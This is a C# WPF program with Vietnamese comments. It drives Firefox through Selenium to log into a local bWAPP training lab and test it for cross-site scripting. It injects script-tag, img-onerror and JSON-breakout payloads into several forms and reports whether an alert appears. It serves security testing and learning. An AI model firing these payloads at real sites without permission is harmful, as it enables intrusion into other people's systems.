using java.sql;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using static com.sun.org.apache.xerces.@internal.impl.XMLDocumentFragmentScannerImpl;

namespace WpfApp1
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            FirefoxDriver firefoxDriver = new FirefoxDriver();
            //vào trang bwapp
            firefoxDriver.Url = "http://192.168.111.129/bWAPP/login.php";
            firefoxDriver.Navigate();
            //thiết lập username/password mặc định
            var username = firefoxDriver.FindElementByCssSelector("#login");
            username.SendKeys("bee");
            var password = firefoxDriver.FindElementByCssSelector("#password");
            password.SendKeys("bug");
            var login = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(4)");
            login.Click();
            //đăng nhập thành công và chờ trang bwapp load html elements mới
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            //chọn lỗ hổng để pentest
            //phần này thêm vào một combobox để chọn các lỗ hổng, chọn cái nào thì mình gọi hàm tương ứng
            Pentest_XSS_Stored_Blog(firefoxDriver);
        }
        public void Pentest_XSS_Reflected_GET(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_GET = firefoxDriver.FindElementByCssSelector("#select_portal > option:nth-child(49)");
            XSS_Reflected_GET.Click();
            //click để xác nhận
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));


            var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("<img src=x onerror=alert(1);>");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("<script>alert(1);</script>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                MessageBox.Show("Your web has this bug");            
            }
            catch (Exception)
            {
                MessageBox.Show("Your web is safe !");
            }
        }

        public void Pentest_XSS_Reflected_POST(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_POST = firefoxDriver.FindElementByCssSelector("#select_portal > option:nth-child(50)");
            XSS_Reflected_POST.Click();
            var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("<script>alert(1)</script>");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("<img src=x onerror=alert(1)>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                MessageBox.Show("Your web has this bug");
            }
            catch (Exception)
            {
                MessageBox.Show("Your web is safe !");
            }
        }

        public void Pentest_XSS_Reflected_JSON(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_JSON = firefoxDriver.FindElementByCssSelector("#select_portal > option:nth-child(51)");
            XSS_Reflected_JSON.Click();
            var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var title = firefoxDriver.FindElementByCssSelector("#title");
            title.SendKeys("\"}]}';alert(1)</script>");
            var search = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            search.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                MessageBox.Show("Your web has this bug");
            }
            catch (Exception)
            {
                MessageBox.Show("Your web is safe !");
            }
        }

        public void Pentest_XSS_Stored_Blog(FirefoxDriver firefoxDriver)
        {
            var XSS_Stored_Blog = firefoxDriver.FindElementByCssSelector("#select_portal > option:nth-child(63)");
            XSS_Stored_Blog.Click();
            var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            IWebElement blog = firefoxDriver.FindElementByCssSelector("#entry");
            blog.SendKeys("<script>alert(1)</script>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > button:nth-child(1)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                MessageBox.Show("Your web has this bug");
            }
            catch (Exception)
            {
                MessageBox.Show("Your web is safe !");
            }
            //xóa các entry vừa tạo
            //bỏ chọn add
            var checkbox_add = firefoxDriver.FindElementByCssSelector("#entry_add");
            checkbox_add.Click();
            //chọn delete
            var checkbox_del = firefoxDriver.FindElementByCssSelector("#entry_delete");
            checkbox_del.Click();
            var submit_2 = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > button:nth-child(1)");
            submit_2.Click();
        }
    }
}
